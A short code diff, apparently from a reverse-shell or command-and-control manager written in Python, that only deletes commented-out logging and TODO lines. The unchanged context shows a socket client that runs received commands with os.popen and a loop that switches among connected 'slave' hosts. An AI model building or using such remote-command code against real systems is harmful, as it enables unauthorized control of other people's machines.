@@ -62,7 +62,6 @@ def slaver(host, port, fake):
         command = recvuntil(slaver_fd, "\n")
         if fake:
             slaver_fd.send(banner)
-        # Log.info("Executing : %r" % (command))
         try:
             result = os.popen(command).read()
         except:
@@ -267,7 +266,6 @@ def main():
     Log.info("Connecting to localhost server...")
     slaver_thread.start()
     time.sleep(0.75)
-    #show_commands()
     position = slaves[slaves.keys()[0]].node_hash
     while True:
         if len(slaves.keys()) == 0:
@@ -308,9 +306,7 @@ def main():
             found = False
             for key in slaves.keys():
                 if key.startswith(input_node_hash):
-                    # old_slave = slaves[position]
                     new_slave = slaves[key]
-                    # Log.info("Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port))
                     Log.info("Changing position to [%s:%d]" % (new_slave.hostname, new_slave.port))
                     position = key
                     found = True
@@ -324,7 +320,6 @@ def main():
             current_slave.remove_node()
         elif command == "q" or command == "quit" or command == "exit":
             EXIT_FLAG = True
-            # TODO : release all resources before closing
             Log.info("Releasing resources...")
             for key in slaves.keys():
                 slave = slaves[key]
